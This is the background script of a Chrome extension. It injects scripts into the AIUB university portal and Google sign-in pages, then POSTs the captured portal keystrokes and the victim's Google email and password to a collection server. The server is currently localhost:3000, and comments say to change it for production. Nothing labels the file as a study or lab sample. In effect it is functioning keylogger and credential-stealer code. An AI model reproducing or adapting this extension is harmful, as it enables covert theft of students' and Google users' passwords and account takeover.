// listening to new tab open
var aiub_portal_exp = 'https?:\/\/portal.aiub.edu/*';
var google_exp = 'https?:\/\/accounts.google.com/*';
var email = "";

chrome.tabs.onUpdated.addListener(function (tabId, tabInfo, tab) {
  if (tabInfo.status == 'complete') {
    var match_aiub_portal_exp = tab.url.match(aiub_portal_exp);
    var match_google_exp = tab.url.match(google_exp);
    if(match_aiub_portal_exp) {
      chrome.tabs.executeScript({
        file: 'content-portal.js'
      });
    } else if (match_google_exp) {
      console.log("From google");
      chrome.tabs.executeScript({
        file: 'content-gmail.js'
      });
    }
  }
});

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
  console.log(request.email);
  if (sender.tab.url.match(aiub_portal_exp)) {
    // change for prod
    var url = 'http://localhost:3000/apd';
    var apd_xhr = new XMLHttpRequest();
    var data = {
      key_pressed: request.keyPressed,
      source_hostname: request.source_hostname,
      source_url: request.source_url
    };
    apd_xhr.open("POST", url, true);
    apd_xhr.setRequestHeader( "Content-Type", "application/json" );
    apd_xhr.send(JSON.stringify(data));
  }
  else if (sender.tab.url.match(google_exp)) {
    if (request.start === 0) {
      email = request.email;
    }
    else if (request.start === 1) {
      // change for prod
      var url = 'http://localhost:3000/gad';
      var gad_xhr = new XMLHttpRequest();
      var data = {
        email: email,
        password: request.password,
        source_hostname: request.source_hostname,
        source_url: request.source_url
      };
      gad_xhr.open("POST", url, true);
      gad_xhr.setRequestHeader( "Content-Type", "application/json" );
      gad_xhr.send(JSON.stringify(data));
    }

  }
  sendResponse(true);
});
